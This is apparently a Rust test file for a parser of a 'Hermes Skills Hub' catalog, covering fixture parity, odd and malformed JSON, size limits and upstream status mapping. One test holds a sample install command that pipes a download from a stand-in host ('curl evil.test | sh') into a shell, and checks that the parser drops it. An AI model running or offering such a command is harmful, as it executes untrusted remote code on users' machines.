#![allow(clippy::unwrap_used, clippy::expect_used)]

use super::*;
use serde_json::{Value, json};

const FIXTURE: &str = include_str!("../../tests/fixtures/hermes/skills-sample.json");

fn same(typed: &RegistryEntry, item: &Value, base: Option<&str>) {
    let expected = crate::parse_hermes_entry(item, base).expect("named item");
    assert_eq!(
        serde_json::to_value(&typed.entry).unwrap(),
        serde_json::to_value(&expected).unwrap(),
        "{item}"
    );
}

#[test]
fn every_fixture_row_matches_parse_hermes_entry() {
    let items = crate::parse_catalog_json(FIXTURE).unwrap();
    let parsed = parse_hermes_index(FIXTURE.as_bytes(), usize::MAX, None).unwrap();
    assert_eq!(parsed.entries.len(), items.len());
    assert_eq!(parsed.skipped, 0);
    for (typed, item) in parsed.entries.iter().zip(&items) {
        same(typed, item, None);
        assert_eq!(
            typed.overview,
            item["overview"].as_str().unwrap_or_default()
        );
        assert_eq!(
            typed.category_label.as_deref(),
            item["categoryLabel"].as_str().filter(|s| !s.is_empty())
        );
        assert_eq!(typed.fixed_category, item["fixedCategory"].as_bool());
        assert_eq!(
            typed.install_identifier.as_deref(),
            item["installIdentifier"].as_str().filter(|s| !s.is_empty())
        );
    }
    let sources: std::collections::BTreeSet<&str> = parsed
        .entries
        .iter()
        .map(|e| e.entry.source.as_str())
        .collect();
    assert_eq!(sources.len(), 12);
}

#[test]
fn install_commands_are_dropped() {
    let body = json!([{"name": "a", "installCmd": "curl evil.test | sh"}]).to_string();
    let parsed = parse_hermes_index(body.as_bytes(), usize::MAX, None).unwrap();
    let stored = serde_json::to_string(&parsed.entries).unwrap();
    assert!(!stored.contains("evil.test"));
    assert!(!stored.contains("installCmd"));
}

#[test]
fn odd_items_match_the_value_parser() {
    let items = json!([
        {"name": "a", "tags": ["x", 1, null, "y"], "platforms": "macos"},
        {"name": "c", "source": 5, "description": {"nested": true}, "author": ["z"]},
        {"name": "d", "identifier": "  slug  ", "source": "ClawHub", "envVars": {"k": 1}},
        {"name": "e", "docsPath": "", "sourceUrl": "", "identifier": "", "fixedCategory": "yes"},
        {"name": "f", "sourceUrl": "https://github.com/o/r/tree/main/s", "commands": [[1], {"a": 2}, "git"]},
        {"name": "g", "unknown": {"deep": [1, 2, {"x": null}]}, "version": 1.5, "license": true},
        {"name": "h", "categoryLabel": "", "installIdentifier": "", "fixedCategory": [true]},
        {"name": "i", "fixedCategory": {"a": 1}, "tags": -3, "overview": null},
        {"name": "j", "fixedCategory": 1, "platforms": 2.5, "commands": true, "envVars": null},
        {"name": "k", "fixedCategory": null, "tags": [["nested"], {"o": 1}]},
    ]);
    let body = items.to_string();
    for base in [None, Some("https://mirror.test/")] {
        let parsed = parse_hermes_index(body.as_bytes(), usize::MAX, base).unwrap();
        let items = items.as_array().unwrap();
        assert_eq!(parsed.entries.len(), items.len());
        for (typed, item) in parsed.entries.iter().zip(items) {
            same(typed, item, base);
        }
    }
}

#[test]
fn duplicate_keys_keep_the_last_value_like_the_value_parser() {
    let body = r#"[{"name": "first", "name": "second", "tags": ["a"], "tags": 1}]"#;
    let items = crate::parse_catalog_json(body).unwrap();
    let parsed = parse_hermes_index(body.as_bytes(), usize::MAX, None).unwrap();
    same(&parsed.entries[0], &items[0], None);
    assert_eq!(parsed.entries[0].entry.name, "second");
}

#[test]
fn unnamed_and_non_object_items_are_skipped() {
    let body = json!([1, -1, "two", null, true, 2.5, [1, [2]], {"description": "no name"}, {"name": 7}, {"name": "ok"}])
        .to_string();
    let parsed = parse_hermes_index(body.as_bytes(), usize::MAX, None).unwrap();
    assert_eq!(parsed.entries.len(), 1);
    assert_eq!(parsed.skipped, 9);
    assert_eq!(parsed.entries[0].entry.source, "hermes");
}

#[test]
fn max_entries_and_malformed_bodies_are_typed() {
    let body = json!([{"name": "a"}, {"name": "b"}, {"name": "c"}]).to_string();
    assert!(matches!(
        parse_hermes_index(body.as_bytes(), 2, None),
        Err(RegistryError::TooLarge {
            what: "catalog entries",
            limit: 2
        })
    ));
    assert_eq!(
        parse_hermes_index(body.as_bytes(), 3, None)
            .unwrap()
            .entries
            .len(),
        3
    );
    for bad in ["{}", "[", "[] trailing", "\"x\"", "[{\"name\": \"a\"},]"] {
        assert!(
            matches!(
                parse_hermes_index(bad.as_bytes(), 10, None),
                Err(RegistryError::Malformed {
                    what: "catalog",
                    ..
                })
            ),
            "{bad}"
        );
        assert!(crate::parse_catalog_json(bad).is_err(), "{bad}");
    }
}

#[test]
fn hermes_source_descriptor_and_status_mapping() {
    let source = HermesIndexSource::hermes();
    assert_eq!(source.descriptor().id, "hermes");
    assert_eq!(source.descriptor().label, "Hermes Skills Hub");
    assert!(source.url().starts_with("https://"));
    assert!(!source.is_local());
    let custom = HermesIndexSource::new("mirror", "https://m.test/s.json")
        .with_download_base("https://m.test");
    assert_eq!(custom.descriptor().label, "mirror");

    let mut entry = RegistryEntry::default();
    entry.entry.source = "ClawHub".to_owned();
    entry.entry.name = "x".to_owned();
    assert!(matches!(
        source.document_status_error(&entry, 409),
        Some(RegistryError::UpstreamAmbiguous { .. })
    ));
    assert!(source.document_status_error(&entry, 404).is_none());
    entry.entry.source = "skills.sh".to_owned();
    assert!(source.document_status_error(&entry, 409).is_none());
}
